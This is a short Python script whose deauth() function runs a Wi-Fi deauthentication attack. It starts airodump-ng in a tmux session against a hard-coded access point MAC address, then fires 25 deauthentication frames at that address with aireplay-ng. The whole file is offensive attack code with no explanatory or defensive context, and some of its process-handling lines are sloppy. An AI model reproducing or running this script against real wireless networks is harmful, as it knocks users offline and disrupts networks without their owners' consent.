import os
import subprocess
from subprocess import check_call

def deauth():
    print("\nAttempting Deauthentication Attack")
    order = "tmux new -d"
    geny  = os.system(order)
    order = "tmux send -Rt 0 airodump-ng -d F4:F2:6D:3C:40:92 -c 1 wlan0mon"
    geny  = os.system(order)
    #order = "airodump-ng -d F4:F2:6D:3C:40:92 -c 1 wlan0mon"
    #geny  = os.system(order)

    os.system("PID=$!")
    #os.system("kill PID")

    order = "aireplay-ng -0 25 -a F4:F2:6D:3C:40:92  wlan0mon"
    geny  = os.system(order)
    if geny == 2:
        print("\nDeauthentication Complete.\n")
        return 1    
    return 0    
